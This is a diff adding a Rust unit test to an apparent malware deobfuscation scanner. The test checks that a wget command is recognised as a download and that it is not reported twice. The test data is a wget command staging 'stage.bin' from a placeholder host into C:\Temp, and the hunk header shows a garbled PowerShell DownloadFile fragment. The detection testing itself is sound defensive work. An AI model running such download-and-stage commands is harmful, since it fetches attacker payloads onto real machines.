@@ -12640,6 +12640,39 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn wget_long_output_document_spaced_in_deob_text_emits_clean_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget --no-check-certificate --output-document C:\Temp\stage.bin https://wget-output-document.example/stage.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-output-document.example/stage.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\stage.bin")
+            )
+        });
+        assert!(
+            has,
+            "wget --output-document DEST destination not recovered: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("wget-output-document.example"))
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "wget --output-document URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn url_variable_liberal_url_in_deob_text_emits_normalized_variable_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
